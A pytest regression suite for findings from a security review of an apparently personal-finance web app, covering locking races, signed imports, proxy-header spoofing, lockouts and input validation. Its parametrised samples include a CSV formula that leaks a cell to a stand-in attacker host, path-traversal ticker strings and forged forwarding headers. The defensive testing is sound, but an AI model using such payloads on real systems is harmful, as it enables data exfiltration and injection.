"""Regressions for the findings in the August 2026 security review.

Each test here failed before its fix and pins the behaviour that closed it, so
a refactor cannot quietly reopen one. The concurrency cases are exercised
against a real PostgreSQL when DATABASE_URL points at one (see
`test_concurrency.py` notes below); the invariants they depend on — the row
lock refreshing the identity map, and the limit check sitting inside it — are
asserted structurally here so the guarantee holds in CI without a database.
"""

import re
from datetime import date
from decimal import Decimal
from pathlib import Path

import pytest
from fastapi import HTTPException

from app import security
from app.services import exports, scenarios

APP = Path(__file__).resolve().parent.parent / "app"


# ---------------------------------------------------------------- PT-01

def test_every_row_lock_refreshes_the_identity_map():
    """`with_for_update()` alone returns the copy already in the Session.

    Read-modify-write on that stale copy loses every concurrent update but the
    last — the lock serialises the writers and each still computes from the
    same pre-lock value. Locks therefore go through `db.for_update()`, which
    adds `populate_existing`; a bare call is the bug coming back.
    """
    offenders = []
    for path in APP.rglob("*.py"):
        if path.name == "db.py":
            continue                      # the helper itself
        for n, line in enumerate(path.read_text().splitlines(), 1):
            if ".with_for_update(" in line:
                offenders.append(f"{path.relative_to(APP)}:{n}")
    assert not offenders, (
        "use db.for_update(stmt) instead of a bare .with_for_update(): " + ", ".join(offenders)
    )


def test_for_update_sets_populate_existing():
    from sqlalchemy import select

    from app.db import for_update
    from app.models import Account

    stmt = for_update(select(Account))
    assert stmt.get_execution_options().get("populate_existing") is True


# ---------------------------------------------------------------- PT-02

def test_deposit_locks_before_it_validates_the_contribution_limit():
    """The limit check and the INSERT that consumes the room are one step.

    Validating first and locking afterwards lets two concurrent deposits both
    see room and both commit, which put $56,000 into a $7,500 Roth bucket.
    """
    src = (APP / "routers" / "accounts.py").read_text()
    body = src[src.index("def deposit("):src.index("def withdraw(")]
    lock_at = body.index("for_update(")
    validate_at = body.index("irs.validate_deposit(")
    assert lock_at < validate_at, "deposit() must take the row lock before validating"
    assert body.index("lock_contribution_scope") < lock_at, (
        "the shared IRA limit spans every IRA the user holds, so the whole set "
        "must be locked, not just the target account"
    )


# ---------------------------------------------------------------- PT-03 / PT-07

def _signed(body: dict) -> dict:
    return {**body, "signature": security.sign_export(body)}


def _minimal(**account) -> dict:
    return {
        "format": "papertick.scenario",
        "version": scenarios.EXPORT_VERSION,
        "scenario": {"name": "T"},
        "accounts": [{"id": "a1", "account_type": "TAXABLE", "name": "n",
                      "settlement_balance": "1.00", **account}],
    }


def test_unsigned_import_is_refused(db, user):
    """Import writes straight into the ledger, so only a file this deployment
    produced may do it. Without this an unauthenticated-by-business-logic call
    minted a $999,999,999.99 balance and a $5,000,000 IRA contribution."""
    with pytest.raises(HTTPException) as exc:
        scenarios.import_scenario(db, user, _minimal(settlement_balance="999999999.99"))
    assert exc.value.status_code == 422
    assert "signature" in str(exc.value.detail)


def test_a_tampered_export_no_longer_verifies(db, user, scenario):
    payload = scenarios.export_scenario(db, user, scenario)
    payload["accounts"] = [dict(a, settlement_balance="999999999.99")
                           for a in payload["accounts"]] or [{"id": "x"}]
    with pytest.raises(HTTPException) as exc:
        scenarios.import_scenario(db, user, payload)
    assert exc.value.status_code == 422


def test_a_genuine_export_round_trips(db, user, scenario, taxable):
    taxable.settlement_balance = Decimal("4321.00")
    db.commit()
    payload = scenarios.export_scenario(db, user, scenario)
    restored = scenarios.import_scenario(db, user, payload, name="Restored")
    db.commit()
    from app.models import Account

    balances = [a.settlement_balance for a in
                db.query(Account).filter(Account.scenario_id == restored.id)]
    assert Decimal("4321.00") in [Decimal(b) for b in balances]


@pytest.mark.parametrize("value", ["NaN", "Infinity", "-Infinity", "1e30"])
def test_non_finite_and_oversized_decimals_are_refused(db, user, value):
    """A stored NaN poisons every later balance sum and turned the account list
    into a permanent 500 with no way back through the UI."""
    with pytest.raises(HTTPException) as exc:
        scenarios.import_scenario(db, user, _signed(_minimal(settlement_balance=value)))
    assert exc.value.status_code == 422


def test_nul_bytes_and_bad_enums_are_refused(db, user):
    with pytest.raises(HTTPException):
        scenarios.import_scenario(db, user, _signed(_minimal(name="a\x00b")))
    with pytest.raises(HTTPException):
        scenarios.import_scenario(db, user, _signed(_minimal(account_type="NOPE")))


# ---------------------------------------------------------------- PT-04

def test_client_supplied_forwarded_for_is_ignored_by_default(monkeypatch):
    """The left-most X-Forwarded-For entry is whatever the client sent.

    Trusting it handed the rate-limit bucket key to the caller: rotating the
    header pushed 12 signups through a 10/hour cap.
    """
    from fastapi import Request

    from app.rate_limit import _trusted_proxies, client_ip

    _trusted_proxies.cache_clear()
    req = Request({"type": "http", "method": "POST", "path": "/",
                   "headers": [(b"x-forwarded-for", b"1.2.3.4, 5.6.7.8")],
                   "query_string": b"", "client": ("198.51.100.7", 1234)})
    assert client_ip(req) == "198.51.100.7"


def test_forwarded_for_is_read_right_to_left_behind_a_trusted_proxy(monkeypatch):
    from fastapi import Request

    from app.config import get_settings
    from app import rate_limit

    s = get_settings().model_copy(update={"trusted_proxy_cidrs": "10.0.0.0/8"})
    monkeypatch.setattr(rate_limit, "get_settings", lambda: s)
    rate_limit._trusted_proxies.cache_clear()
    req = Request({"type": "http", "method": "POST", "path": "/",
                   # the client forged the first two; 203.0.113.9 is what the
                   # trusted proxy actually observed
                   "headers": [(b"x-forwarded-for", b"9.9.9.9, 8.8.8.8, 203.0.113.9")],
                   "query_string": b"", "client": ("10.1.2.3", 1234)})
    assert rate_limit.client_ip(req) == "203.0.113.9"
    rate_limit._trusted_proxies.cache_clear()


# ---------------------------------------------------------------- PT-05

def test_lockout_is_scoped_to_the_source_not_just_the_account():
    """Keying the lockout on the email alone let anyone who knew an address
    lock its owner out indefinitely."""
    from app.rate_limit import _lock_key

    assert _lock_key("v@example.com", "1.1.1.1") != _lock_key("v@example.com", "2.2.2.2")


# ---------------------------------------------------------------- PT-08

@pytest.mark.parametrize("payload", [
    '=HYPERLINK("http://attacker.example/?"&A1,"x")',
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
])
def test_exports_neutralise_spreadsheet_formulas(payload):
    """An account name is user-controlled and lands in a file someone else
    opens in Excel."""
    assert exports.sanitize_cell(payload).startswith("'")
    csv_bytes = exports.to_csv(["Account"], [[payload]])
    assert b"\n'" in csv_bytes or b",'" in csv_bytes or csv_bytes.count(b"'") >= 1
    assert exports.sanitize_cell("Roth IRA") == "Roth IRA"     # ordinary text untouched


# ---------------------------------------------------------------- PT-14

@pytest.mark.parametrize("bad", [
    "../../v3/reference/tickers", "AAPL?modules=x", "AAPL\x00", "A" * 20, "", "1ABC", "<script>",
])
def test_bad_tickers_are_refused(bad):
    """The symbol reaches an upstream provider's URL path and a cache key."""
    from app.schemas import _ticker

    with pytest.raises(ValueError):
        _ticker(bad)


@pytest.mark.parametrize("good,want", [("voo", "VOO"), ("BRK-B", "BRK-B"), ("vt.x", "VT.X")])
def test_real_symbols_still_pass(good, want):
    from app.schemas import _ticker

    assert _ticker(good) == want


# ---------------------------------------------------------------- PT-23

def test_wipe_zeroes_the_buffer_it_was_given():
    """`wipe(bytearray(key))` zeroed a throwaway copy and left the original."""
    buf = bytearray(b"\xff" * 32)
    security.wipe(buf)
    assert buf == bytearray(32)


def test_derive_key_returns_a_wipeable_buffer():
    key = security._derive_key(b"salt", b"info")
    assert isinstance(key, bytearray)
    security.wipe(key)
    assert key == bytearray(len(key))


# ---------------------------------------------------------------- PT-30

def test_like_wildcards_from_the_caller_are_escaped():
    from app.routers.market import _like

    assert _like("100%") == "100\\%"
    assert _like("a_b") == "a\\_b"
    assert _like("plain") == "plain"


# ---------------------------------------------------------------- PT-15

def test_docs_pages_load_no_third_party_scripts():
    """An unauthenticated page on the API's own origin must not execute code
    fetched from a CDN at a floating version with no integrity hash."""
    src = (APP / "docs_ui.py").read_text()
    assert not re.search(r"https?://(?!localhost)[^\"'\s]+\.(js|css)", src), \
        "documentation assets must be served from app/static"
